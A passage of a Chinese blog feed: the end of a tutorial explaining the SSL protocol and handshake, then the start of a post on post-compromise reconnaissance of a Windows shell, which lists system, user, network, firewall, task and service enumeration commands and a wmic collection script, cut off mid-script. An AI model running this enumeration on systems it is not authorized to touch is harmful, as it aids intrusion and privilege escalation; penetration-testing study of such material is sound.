产生背景</strong></h2><p>说的简单一点，其实就是随着互联网的发展，互联网能帮我们实现越来越多的操作，比如支付，转账等，这种敏感信息在网上传播如果没有保护是很危险的**(传统的万维网协议HTTP不具备安全机制——采用明文的形式传输数据、不能验证通信双方的身份、无法防止传输的数据被篡改等)<strong>，信息不仅仅在传输过程中会被窃听，甚至你对其一万个放心的输入自己支付密码的网站本身就是伪造的，所以我们必须找到一种方式来确认互联网中交互双方的身份，并且能保证数据在传输过程中是加密的，防止遭受窃听攻击,于是乎 SSL 就出现了，它利用</strong>数据加密、身份验证和消息完整性验证机制**，为网络上数据的传输提供安全性保证。</p><h2 id="0X02-技术优点"><a href="#0X02-技术优点" class="headerlink" title="0X02 技术优点"></a><strong>0X02 技术优点</strong></h2><p>SSL支持各种应用层协议。虽然 SSL 设计的初衷是为了解决万维网安全性问题，但是由于SSL <strong>位于应用层和传输层之间</strong>，如下图所示，它可以为任何基于TCP等可靠连接的应用层协议提供安全性保证。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL5.png" alt="此处输入图片的描述"></p><h2 id="0X03-安全机制"><a href="#0X03-安全机制" class="headerlink" title="0X03 安全机制"></a><strong>0X03 安全机制</strong></h2><p><strong>SSL协议实现的安全机制包括：</strong></p><p>**(1)数据传输的机密性：**利用对称密钥算法对传输的数据进行加密。<br>**(2)身份验证机制：**基于证书利用数字签名方法对服务器和客户端进行身份验证，其中客户端的身份验证是可选的。<br>**(3)消息完整性验证：**消息传输过程中使用 MAC 算法来检验消息的完整性。</p><h3 id="3-1数据传输的机密性"><a href="#3-1数据传输的机密性" class="headerlink" title="3.1数据传输的机密性"></a><strong>3.1数据传输的机密性</strong></h3><p>网络上传输的数据很容易被非法用户窃取，SSL采用在通信双方之间建立加密通道的方法保证数据传输的机密性。所谓加密通道，是指发送方在发送数据前，使用加密算法和加密密钥对数据进行加密，然后将数据发送给对方,接收方接收到数据后，利用解密算法和解密密钥从密文中获取明文。没有解密密钥的第三方，无法将密文恢复为明文，从而保证数据传输的机密性。</p><p><strong>加解密算法分为两类：</strong><br>**(1)对称密钥算法：**数据加密和解密时使用相同的密钥。<br>**(2)非对称密钥算法：**数据加密和解密时使用不同的密钥，一个是公开的公钥，一个是由用户秘密保存的私钥。利用公钥（或私钥）加密的数据只能用相应的私钥（或公钥）才能解密。</p><p><strong>两者的比较和适用范围：</strong></p><p>与非对称密钥算法相比，对称密钥算法具有计算速度快的优点，通常用于对大量信息进行加密（如对所有报文加密），而非对称密钥算法，一般用于数字签名和对较少的信息进行加密。</p><p>SSL加密通道上的数据加解密使用对称密钥算法，<strong>目前主要支持的算法有DES、3DES、AES等</strong>，这些算法都可以有效地防止交互数据被窃听。对称密钥算法要求解密密钥和加密密钥完全一致。因此，利用对称密钥算法加密传输数据之前，需要在通信两端部署相同的密钥(这里使用的是非对称密钥算法,<strong>通常是RSA</strong>进行交换)。详细的对称密钥的部署方法请看后面的 <strong>3.4 利用非对称密钥算法保证密钥本身的安全</strong>。</p><h3 id="3-2-身份验证机制"><a href="#3-2-身份验证机制" class="headerlink" title="3.2 身份验证机制"></a><strong>3.2 身份验证机制</strong></h3><p>电子商务和网上银行等应用中必须<strong>保证要登录的Web服务器是真实的</strong>，以免重要信息被非法窃取。SSL利用<strong>数字签名</strong>来验证通信对端的身份。非对称密钥算法可以用来实现数字签名。由于通过私钥加密后的数据只能利用对应的公钥进行解密，因此根据解密是否成功，就可以判断发送者的身份，如同发送者对数据进行了“签名”。例如，Alice使用自己的私钥对一段固定的信息加密后发给Bob，Bob利用Alice的公钥解密，如果解密结果与固定信息相同，那么就能够确认信息的发送者为Alice，这个过程就称为数字签名。</p><p>SSL客户端必须验证SSL服务器的身份，**SSL服务器是否验证SSL客户端的身份，则由SSL服务器决定。**SSL客户端和SSL服务器的身份验证过程，请看后面的 <strong>4.2 SSL握手过程。</strong></p><p>使用数字签名验证身份时，需要确保被验证者的公钥是真实的，否则，非法用户可能会冒充被验证者与验证者通信。所下图所示，Cindy冒充Bob，将自己的公钥发给Alice，并利用自己的私钥计算出签名发送给Alice，Alice利用“Bob”的公钥（实际上为Cindy的公钥）成功验证该签名，则Alice认为Bob的身份验证成功，而实际上与Alice通信的是冒充Bob的Cindy。SSL利用PKI提供的机制保证公钥的真实性，详细介绍请看后面的 <strong>3.5 利用PKI保证公钥的真实性。</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL1.png" alt="此处输入图片的描述"></p><h3 id="3-3-消息完整性验证"><a href="#3-3-消息完整性验证" class="headerlink" title="3.3 消息完整性验证"></a><strong>3.3 消息完整性验证</strong></h3><p>为了避免网络中传输的数据被非法篡改，SSL利用基于MD5或SHA的MAC算法来保证消息的完整性。**MAC算法是在密钥参与下的(这是与普通的 hash 最大的不同，可以简单理解为带密钥的 hash )**数据摘要算法，能将密钥和任意长度的数据转换为固定长度的数据。利用MAC算法验证消息完整性的过程如图2所示。发送者在密钥的参与下，利用MAC算法计算出消息的MAC值，并将其加在消息之后发送给接收者。接收者利用同样的密钥和MAC算法计算出消息的MAC值，并与接收到的MAC值比较。如果二者相同，则报文没有改变；否则，报文在传输过程中被修改，接收者将丢弃该报文。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL2.png" alt="此处输入图片的描述"></p><p><strong>MAC算法具有如下特征，使其能够用来验证消息的完整性：</strong></p><p>(1)<strong>消息的任何改变，都会引起输出的固定长度数据产生变化</strong>。通过比较MAC值，可以保证接收者能够发现消息的改变。<br>(2)<strong>MAC 算法需要密钥的参与</strong>，因此没有密钥的非法用户在改变消息的内容后，无法添加正确的MAC值，从而保证非法用户无法随意修改消息内容。</p><p>MAC算法要求通信双方具有相同的密钥，否则MAC值验证将会失败。因此，利用MAC算法验证消息完整性之前，需要在通信两端部署相同的密钥。MAC密钥的部署方法同样请见下面一节 <strong>3.4 利用非对称密钥算法保证密钥本身的安全。</strong></p><h3 id="3-4-利用非对称密钥算法保证密钥本身的安全"><a href="#3-4-利用非对称密钥算法保证密钥本身的安全" class="headerlink" title="3.4 利用非对称密钥算法保证密钥本身的安全"></a><strong>3.4 利用非对称密钥算法保证密钥本身的安全</strong></h3><p>上面已经讲到，对称密钥算法和MAC算法要求通信双方具有相同的密钥，否则解密或MAC值验证将失败。因此，要建立加密通道或验证消息完整性，必须先在通信双方部署一致的密钥。</p><p>SSL利用<strong>非对称密钥算法加密密钥的方法实现密钥交换</strong>，保证第三方无法获取该密钥。如图3所示，SSL客户端（如Web浏览器）利用SSL服务器（如Web服务器）的<strong>公钥加密密钥</strong>，将加密后的密钥发送给SSL服务器，只有拥有对应私钥的SSL服务器才能从密文中获取原始的密钥。<strong>SSL通常采用RSA算法加密传输密钥</strong>。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL3.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong></p><p>(1)实际上，SSL 客户端发送给SSL服务器的密钥<strong>不能直接用来加密数据或计算MAC值</strong>，该密钥是用来计算对称密钥和MAC密钥的信息，<strong>称为premaster secret</strong>。SSL客户端和SSL 服务器利用premaster secret计算出相同的主密钥（master secret），再利用master secret 生成用于对称密钥算法、MAC算法等的密钥。premaster secret 是计算对称密钥、MAC 算法密钥的关键。</p><p>(2)用来实现密钥交换的算法称为密钥交换算法。非对称密钥算法RSA 用于密钥交换时，也可以<strong>称之为密钥交换算法</strong>。</p></blockquote><p>也就是说，如果仔细研究的话就会知道 premaster secret 并不是真正的对称密钥，真正的对称密钥叫做master secret ，是由 premaster secret 和 客户端以及服务器分别产生的参数计算而成的，计算的方法如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL4.png" alt="此处输入图片的描述"></p><p>那么这个 random 是哪里来的呢？实际上是在 SSL 握手的过程中产生的，由于这部分内容在后面的 4**.1 只验证服务器的 SSL 握手过程** 的补充部分将会讲到，这里就不再详细阐述。</p><p>利用非对称密钥算法加密密钥之前，发送者需要获取接收者的公钥，并保证该公钥确实属于接收者，否则，密钥可能会被非法用户窃取。如图一所示，Cindy冒充Bob，将自己的公钥发给Alice，Alice利用Cindy的公钥加密发送给Bob的数据，Bob由于没有对应的私钥无法解密该数据，而Cindy截取数据后，可以利用自己的私钥解密该数据。SSL利用PKI提供的机制保证公钥的真实性，详细介绍请看下一节 <strong>3.5 利用PKI保证公钥的真实性</strong>。</p><h3 id="3-5-利用PKI保证公钥的真实性"><a href="#3-5-利用PKI保证公钥的真实性" class="headerlink" title="3.5 利用PKI保证公钥的真实性"></a><strong>3.5 利用PKI保证公钥的真实性</strong></h3><p>PKI通过数字证书来发布用户的公钥，并提供了验证公钥真实性的机制。数字证书（简称证书）是一个包含用户的公钥及其身份信息的文件，证明了用户与公钥的关联。数字证书由权威机构——CA签发，并由CA保证数字证书的真实性。</p><p>SSL客户端把密钥加密传递给SSL服务器之前，SSL服务器需要将从CA获取的证书发送给SSL客户端，SSL客户端通过PKI判断该证书的真实性。如果该证书确实属于SSL服务器，则利用该证书中的公钥加密密钥，发送给SSL服务器。</p><p>验证SSL服务器&#x2F;SSL客户端的身份之前，SSL服务器&#x2F;SSL客户端需要将从CA获取的证书发送给对端，对端通过PKI判断该证书的真实性。如果该证书确实属于SSL服务器&#x2F;SSL客户端，则对端利用该证书中的公钥验证SSL服务器&#x2F;SSL客户端的身份。</p><h2 id="0X04-协议工作过程"><a href="#0X04-协议工作过程" class="headerlink" title="0X04 协议工作过程"></a><strong>0X04 协议工作过程</strong></h2><p>协议最主要的过程就是密钥协商，SSL通过握手过程在客户端和服务器之间协商会话参数，并建立会话。会话包含的主要参数有会话ID、对方的证书、加密套件（密钥交换算法、数据加密算法和MAC算法等）以及主密钥（master secret）。通过SSL会话传输的数据，都将采用该会话的主密钥和加密套件进行加密、计算MAC等处理。</p><p>不同情况下，SSL握手过程存在差异。下面将分别描述以下三种情况下的握手过程：</p><ul><li>只验证服务器的 SSL 握手过程</li><li>验证服务器和客户端的 SSL 握手过程</li><li>恢复原有会话的 SSL 握手过程</li></ul><h3 id="4-1-只验证服务器的-SSL-握手过程"><a href="#4-1-只验证服务器的-SSL-握手过程" class="headerlink" title="4.1 只验证服务器的 SSL 握手过程"></a><strong>4.1 只验证服务器的 SSL 握手过程</strong></h3><p>这种方式应该是我们每天上网都在进行的，所以放在第一个</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL6.png" alt="此处输入图片的描述"></p><p><strong>如图5所示，只需要验证SSL服务器身份，不需要验证SSL客户端身份时，SSL的握手过程为：</strong></p><p>(1) SSL 客户端通过Client Hello 消息将它支持的SSL 版本、加密算法、密钥交换算法、MAC 算法等信息发送给SSL 服务器。</p><p>(2) SSL 服务器确定本次通信采用的SSL 版本和加密套件，并通过Server Hello消息通知给SSL 客户端。如果SSL 服务器允许SSL客户端在以后的通信中重用本次会话，则SSL服务器会为本次会话分配会话ID，并通过Server Hello 消息发送给SSL 客户端。</p><p>(3) SSL 服务器将携带自己公钥信息的数字证书通过Certificate 消息发送给SSL客户端。</p><p>(4) SSL 服务器发送Server Hello Done 消息，通知SSL客户端版本和加密套件协商结束，开始进行密钥交换。</p><p>(5) SSL 客户端验证SSL 服务器的证书合法后，利用证书中的公钥加密SSL 客户端随机生成的premaster secret，并通过Client Key Exchange 消息发送给SSL 服务器。</p><p>(6) SSL 客户端发送Change Cipher Spec 消息，通知SSL 服务器后续报文将采用协商好的密钥和加密套件进行加密和MAC 计算。</p><p>(7) SSL 客户端计算已交互的握手消息（除Change Cipher Spec 消息外所有已交互的消息）的Hash 值，利用协商好的密钥和加密套件处理Hash 值（计算并添加MAC 值、加密等），并通过Finished 消息发送给SSL 服务器。SSL服务器利用同样的方法计算已交互的握手消息的Hash 值，并与Finished 消息的解密结果比较，如果二者相同，且MAC 值验证成功，则证明密钥和加密套件协商成功。</p><p>(8) 同样地，SSL 服务器发送Change Cipher Spec 消息，通知SSL 客户端后续报文将采用协商好的密钥和加密套件进行加密和MAC 计算。</p><p>(9) SSL 服务器计算已交互的握手消息的Hash 值，利用协商好的密钥和加密套件处理Hash 值（计算并添加MAC 值、加密等），并通过Finished 消息发送给SSL 客户端。SSL 客户端利用同样的方法计算已交互的握手消息的<br>Hash 值，并与Finished 消息的解密结果比较，如果二者相同，且MAC 值验证成功，则证明密钥和加密套件协商成功。</p><p>SSL客户端接收到SSL服务器发送的Finished消息后，如果解密成功，则可以判断SSL服务器是数字证书的拥有者，即SSL服务器身份验证成功，因为只有拥有私钥的SSL服务器才能从Client Key Exchange消息中解密得到premaster secret，从而间接地实现了SSL客户端对SSL服务器的身份验证。</p><blockquote><p><strong>注意：</strong></p><p>(1)Change Cipher Spec 消息属于SSL 密码变化协议，其他握手过程交互的消息均属于SSL 握手协议，统称为SSL握手消息。<br>(2)计算 Hash 值，指的是利用Hash 算法（MD5 或SHA）将任意长度的数据转换为固 定长度的数据。</p></blockquote><p><strong>可能上面的过程过于复杂和理论化，图片对整个过程的展示也不够清晰，于是为了更直观地弄清楚我建议结合下面这幅图帮助大家理解</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL7.png" alt="此处输入图片的描述"></p><p>这幅图是使用 RSA 来协商密钥的一个实际的例子(之前说过了我们需要使用公钥来协商用来加密的对称密码的密钥)。</p><p>(1) 客户端首先产生一个随机数 client random 发给服务器端</p><p>(2)服务器端也产生一个随机数 server random 并且将自己经过 CA 认证的证书(里面保存着自己的RSA公钥)连同 server random 一起发给客户端</p><p>(3)客户端验证 CA 的签名无误后，确认这个公钥来源于服务器端，那么就打开证书取出其中的 RSA 公钥，然后产生另一个随机数 premaster secret (这是整个过程中的第三个随机数) ，使用 RSA 公钥加密这个 premaster secret 发送给服务器端</p><p>(4)服务器端使用自己的私钥解密得到 premaster secret</p><p>(5)双方现在都拥有了三个随机数 client random 、server random 、premaster secret ，然后双方都使用我在 3.4 节提到的算法计算出双方的共享密钥 session key </p><p><strong>补充：</strong></p><p>因为这个图是来源于 CloudFlare，我们知道该公司主要提供的是 CDN 加速服务，也就是说客户端是直接和该公司提供的 CDN 服务器进行交互的，但是出于安全考虑，我们又不能把私钥交给CDN服务商，那这种密钥的交换是怎么实现的呢，如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL8.png" alt="此处输入图片的描述"></p><p>我们设立了一个专门的密钥服务器，所有的 CDN 服务器都要与密钥服务器交互来实现使用私钥解密公钥加密的 premaster secret</p><h3 id="4-2-验证服务器和客户端的SSL握手过程"><a href="#4-2-验证服务器和客户端的SSL握手过程" class="headerlink" title="4.2 验证服务器和客户端的SSL握手过程"></a><strong>4.2 验证服务器和客户端的SSL握手过程</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL9.png" alt="此处输入图片的描述"></p><p>SSL客户端的身份验证是可选的，由SSL服务器决定是否验证SSL客户端的身份。如图6中蓝色部分标识的内容所示，如果SSL服务器验证SSL客户端身份，则SSL服务器和SSL客户端除了交互 <strong>4.1 只验证服务器的SSL握手过程</strong> 中的消息协商密钥和加密套件外，还需要进行以下操作：</p><p>(4) SSL 服务器发送Certificate Request 消息，请求SSL 客户端将其证书发送给SSL 服务器。</p><p>(6) SSL 客户端通过Certificate 消息将携带自己公钥的证书发送给SSL 服务器。SSL 服务器验证该证书的合法性。</p><p>(8) SSL 客户端计算已交互的握手消息、主密钥的Hash 值，利用自己的私钥对 其进行加密，并通过Certificate Verify 消息发送给SSL 服务器。</p><p>SSL 服务器计算已交互的握手消息、主密钥的Hash 值，利用SSL 客户端证书中的公钥解密Certificate Verify 消息，并将解密结果与计算出的Hash 值比较。如果二者相同，则SSL 客户端身份验证成功</p><h3 id="4-3-恢复原有会话的SSL握手过程"><a href="#4-3-恢复原有会话的SSL握手过程" class="headerlink" title="4.3 恢复原有会话的SSL握手过程"></a><strong>4.3 恢复原有会话的SSL握手过程</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSL10.png" alt="此处输入图片的描述"></p><p>协商会话参数、建立会话的过程中，需要使用非对称密钥算法来加密密钥、验证通信对端的身份，计算量较大，占用了大量的系统资源。为了简化SSL握手过程，SSL允许重用已经协商过的会话</p><p><strong>具体过程为：</strong></p><p>(1) SSL 客户端发送Client Hello 消息，消息中的会话ID 设置为计划重用的会话的ID。</p><p>(2) SSL 服务器如果允许重用该会话，则通过在Server Hello 消息中设置相同的会话ID 来应答。这样，SSL 客户端和SSL 服务器就可以利用原有会话的密钥和加密套件，不必重新协商。</p><p>(3) SSL 客户端发送Change Cipher Spec 消息，通知SSL 服务器后续报文将采用原有会话的密钥和加密套件进行加密和MAC 计算。</p><p>(4) SSL 客户端计算已交互的握手消息的Hash 值，利用原有会话的密钥和加密套件处理Hash 值，并通过Finished 消息发送给SSL 服务器，以便SSL 服务器判断密钥和加密套件是否正确。</p><p>(5) 同样地，SSL 服务器发送Change Cipher Spec 消息，通知SSL 客户端后续报文将采用原有会话的密钥和加密套件进行加密和MAC 计算。</p><p>(6) SSL 服务器计算已交互的握手消息的Hash 值，利用原有会话的密钥和加密套件处理Hash 值，并通过Finished 消息发送给SSL 客户端，以便SSL 客户端判断密钥和加密套件是否正确。</p><h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a><strong>0X05 总结</strong></h2><p>花了一点时间简单的总结、梳理和归纳了一下 SSL 协议，也希望日后的工作学习中能有所参考</p><h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="https://www.linuxidc.com/Linux/2015-07/120230.htm">https://www.linuxidc.com/Linux/2015-07/120230.htm</a><br><a href="http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html">http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html</a><br><a href="https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/">https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/</a><br><a href="https://blog.cloudflare.com/announcing-keyless-ssl-all-the-benefits-of-cloudflare-without-having-to-turn-over-your-private-ssl-keys/">https://blog.cloudflare.com/announcing-keyless-ssl-all-the-benefits-of-cloudflare-without-having-to-turn-over-your-private-ssl-keys/</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学 网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>拿到一个普通的 Windows Shell 以后能做什么</title>
    <link href="/2019/01/27/%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%20Windows%20Shell%20%E4%BB%A5%E5%90%8E%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88/"/>
    <url>/2019/01/27/%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%20Windows%20Shell%20%E4%BB%A5%E5%90%8E%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>看到一篇文章讲到这个内容，就打算自己也整理一下顺便梳理一下思路</p><h2 id="0X01-信息收集"><a href="#0X01-信息收集" class="headerlink" title="0X01 信息收集"></a><strong>0X01 信息收集</strong></h2><h3 id="1-收集系统信息："><a href="#1-收集系统信息：" class="headerlink" title="1.收集系统信息："></a><strong>1.收集系统信息：</strong></h3><p>系统信息至关重要，关乎我们后面怎么提权</p><pre><code class="hljs">中文系统：systeminfo|findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;英文系统: systeminfo|findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></pre><p><strong>例如：</strong></p><pre><code class="hljs">C:\Users\Administrator&gt;systeminfo|findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;OS 名称:          Microsoft Windows Server 2008 R2 StandardOS 版本:          6.1.7600 暂缺 Build 7600</code></pre><span id="more"></span><h3 id="2-主机名和Shell用户名"><a href="#2-主机名和Shell用户名" class="headerlink" title="2.主机名和Shell用户名"></a><strong>2.主机名和Shell用户名</strong></h3><pre><code class="hljs">C:\Users\Administrator&gt;hostnameWIN-ITRDTMACNHNC:\Users\Administrator&gt;echo %username%Administrator</code></pre><h3 id="3-其他用户组和当前用户详细信息"><a href="#3-其他用户组和当前用户详细信息" class="headerlink" title="3.其他用户组和当前用户详细信息"></a><strong>3.其他用户组和当前用户详细信息</strong></h3><p>通过这个信息收集我们能判断我们的用户属于什么用户组</p><pre><code class="hljs">C:\Users\Administrator&gt;net users\\WIN-ITRDTMACNHN 的用户帐户--------------------------------------------------------------Administrator            FTPuser                  Guest命令成功完成。C:\Users\Administrator&gt;net user Administrator用户名                 Administrator全名注释                   管理计算机(域)的内置帐户用户的注释国家/地区代码          000 (系统默认值)帐户启用               Yes帐户到期               从不上次设置密码           2018/6/28 16:32:48密码到期               2018/8/9 16:32:48密码可更改             2018/6/28 16:32:48需要密码               Yes用户可以更改密码       Yes允许的工作站           All登录脚本用户配置文件主目录上次登录               2018/9/30 11:34:43可允许的登录小时数     All本地组成员             *Administrators全局组成员             *None命令成功完成。</code></pre><h3 id="4-网络配置信息"><a href="#4-网络配置信息" class="headerlink" title="4.网络配置信息"></a><strong>4.网络配置信息</strong></h3><p>使用下面的三条命名就能比较好的看出主机    </p><pre><code class="hljs">ipconfig /allroute print arp -A</code></pre><h3 id="5-检查主机的端口开放情况"><a href="#5-检查主机的端口开放情况" class="headerlink" title="5.检查主机的端口开放情况"></a><strong>5.检查主机的端口开放情况</strong></h3><pre><code class="hljs">netstat -ano</code></pre><h3 id="6-检查主机的防火墙规则"><a href="#6-检查主机的防火墙规则" class="headerlink" title="6.检查主机的防火墙规则"></a><strong>6.检查主机的防火墙规则</strong></h3><pre><code class="hljs">C:\Users\Administrator&gt;netsh firewall show state防火墙状态:-------------------------------------------------------------------配置文件                          = 标准操作模式                          = 启用例外模式                          = 启用多播/广播响应模式                 = 启用通知模式                          = 禁用组策略版本                        = Windows 防火墙远程管理模式                      = 禁用所有网络接口上的端口当前均为打开状态:端口   协议  版本  程序-------------------------------------------------------------------800    TCP       任何       (null)C:\Users\Administrator&gt;netsh firewall show config域 配置文件配置:-------------------------------------------------------------------操作模式                          = 启用例外模式                          = 启用多播/广播响应模式                 = 启用通知模式                          = 禁用域 配置文件的允许的程序配置:模式     流量方向             名称/程序-------------------------------------------------------------------禁用       入站                   Windows 服务主进程 / C:\Windows\System32\svchst.exe禁用       入站                   Internet Explorer / C:\Program Files (x86)\Inernet Explorer\iexplore.exe域 配置文件的端口配置:端口   协议    流量方向              名称-------------------------------------------------------------------800    TCP       启用      入站                    test域 配置文件的 ICMP 配置:模式     类型  描述-------------------------------------------------------------------启用       2     允许出站数据包太大标准 配置文件配置(当前):-------------------------------------------------------------------操作模式                          = 启用例外模式                          = 启用多播/广播响应模式                 = 启用通知模式                          = 禁用标准 配置文件的允许的程序配置:模式     流量方向             名称/程序-------------------------------------------------------------------启用       入站                   Windows 服务主进程 / C:\Windows\System32\svchst.exe标准 配置文件的端口配置:端口   协议    流量方向              名称-------------------------------------------------------------------800    TCP       启用      入站                    test标准 配置文件的 ICMP 配置:模式     类型  描述-------------------------------------------------------------------启用       2     允许出站数据包太大日志配置:-------------------------------------------------------------------文件位置        = C:\Windows\system32\LogFiles\Firewall\pfirewall.log文件大小上限    = 4096 KB丢弃的数据包数  = 禁用连接数          = 禁用</code></pre><h3 id="7-计划任务"><a href="#7-计划任务" class="headerlink" title="7.计划任务"></a><strong>7.计划任务</strong></h3><pre><code class="hljs">C:\Users\K0rz3n&gt;schtasks /query /fo LIST /v主机名:                             DESKTOP-S2L4C24任务名:                             \CorelUpdateHelperTaskCore下次运行时间:                       2019/1/23 0:32:42模式:                               就绪登录状态:                           交互方式/后台方式上次运行时间:                       2019/1/22 0:32:42上次结果:                           0创建者:                             N/A要运行的任务:                       c:\Program Files (x86)\Corel\CUH\v2\CUH.exe /t起始于:                             N/A注释:                               N/A计划任务状态:                       已启用空闲时间:                           已禁用电源管理:                           在电池模式停止, 不用电池启动作为用户运行:                       Users删除没有计划的任务:                 已禁用如果运行了 X 小时 X 分钟，停止任务: 72:00:00计划:                               计划数据在此格式中不可用。计划类型:                           每天开始时间:                           0:32:42开始日期:                           2018/10/7结束日期:                           N/A天:                                 每 1 天月:                                 N/A重复: 每:                           已禁用重复: 截止: 时间:                   已禁用重复: 截止: 持续时间:               已禁用重复: 如果还在运行，停止:           已禁用</code></pre><h3 id="8-正在运行的进程"><a href="#8-正在运行的进程" class="headerlink" title="8.正在运行的进程"></a><strong>8.正在运行的进程</strong></h3><pre><code class="hljs">C:\Users\Administrator&gt;tasklist /SVC映像名称                       PID 服务========================= ======== =======================================System Idle Process              0 暂缺System                           4 暂缺smss.exe                       232 暂缺csrss.exe                      332 暂缺wininit.exe                    384 暂缺csrss.exe                      392 暂缺winlogon.exe                   448 暂缺services.exe                   484 暂缺lsass.exe                      500 SamSslsm.exe                        508 暂缺svchost.exe                    608 DcomLaunch, PlugPlay, Powervmacthlp.exe                   672 VMware Physical Disk Helper Servicesvchost.exe                    716 RpcEptMapper, RpcSssvchost.exe                    788 Dhcp, eventlog, lmhostssvchost.exe                    844 gpsvc, IKEEXT, iphlpsvc, LanmanServer,                                   ProfSvc, Schedule, seclogon, SENS,                                   ShellHWDetection, Winmgmt, wuauservsvchost.exe                    932 EventSystem, netprofm, nsisvchost.exe                    996 Netman, TrkWks, UxSmssvchost.exe                    256 CryptSvc, Dnscache, LanmanWorkstation,                                   NlaSvc, WinRMsvchost.exe                    688 BFE, DPS, MpsSvcspoolsv.exe                   1092 Spoolersvchost.exe                   1124 AppHostSvcsvchost.exe                   1148 ftpsvcsvchost.exe                   1324 RemoteRegistry...</code></pre><h3 id="9-已经启动的服务"><a href="#9-已经启动的服务" class="headerlink" title="9.已经启动的服务"></a><strong>9.已经启动的服务</strong></h3><pre><code class="hljs">C:\Users\Administrator&gt;net start已经启动以下 Windows 服务:   Application Host Helper Service   Base Filtering Engine   COM+ Event System   COM+ System Application   Cryptographic Services   DCOM Server Process Launcher   Desktop Window Manager Session Manager   DHCP Client   Diagnostic Policy Service   Distributed Link Tracking Client   Distributed Transaction Coordinator   DNS Client   Group Policy Client   IKE and AuthIP IPsec Keying Modules   IP Helper   IPsec Policy Agent   Microsoft FTP Service   Network Connections   Network List Service   Network Location Awareness   Network Store Interface Service   Plug and Play   Power   Print Spooler   Remote Procedure Call (RPC)   Remote Registry   RPC Endpoint Mapper   ...</code></pre><h3 id="10-已经安装的驱动"><a href="#10-已经安装的驱动" class="headerlink" title="10.已经安装的驱动"></a><strong>10.已经安装的驱动</strong></h3><pre><code class="hljs">C:\Users\Administrator&gt;driverquery模块名       显示名称               驱动程序类型  链接日期============ ====================== ============= ======================1394ohci     1394 OHCI Compliant Ho Kernel        2009/7/14 8:07:12ACPI         Microsoft ACPI Driver  Kernel        2009/7/14 7:19:34AcpiPmi      ACPI Power Meter Drive Kernel        2009/7/14 7:27:17adp94xx      adp94xx                Kernel        2008/12/6 7:54:42adpahci      adpahci                Kernel        2007/5/2 1:30:09adpu320      adpu320                Kernel        2007/2/28 8:04:15AFD          Ancillary Function Dri Kernel        2009/7/14 7:21:40agp440       Intel AGP Bus Filter   Kernel        2009/7/14 7:38:43aliide       aliide                 Kernel        2009/7/14 7:19:47amdide       amdide                 Kernel        2009/7/14 7:19:49AmdK8        AMD K8 Processor Drive Kernel        2009/7/14 7:19:25AmdPPM       AMD Processor Driver   Kernel        2009/7/14 7:19:25amdsata      amdsata                Kernel        2009/5/20 1:53:21amdsbs       amdsbs                 Kernel        2009/3/21 2:36:03amdxata      amdxata                Kernel        2009/5/20 1:56:59...</code></pre><h3 id="11-使用-wmic-收集重要信息"><a href="#11-使用-wmic-收集重要信息" class="headerlink" title="11.使用 wmic 收集重要信息"></a><strong>11.使用 wmic 收集重要信息</strong></h3><p>运行下面这个脚本来收集进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的 Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。</p><pre><code class="hljs">for /f &quot;delims=&quot; %%A in (&#39;dir /s /b %WINDIR%\system32\*htable.xsl&#39;) do set &quot;var=%%A&quot;wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic group list full /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic nicconfig where IPEnabled=&#39;true&#39; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory 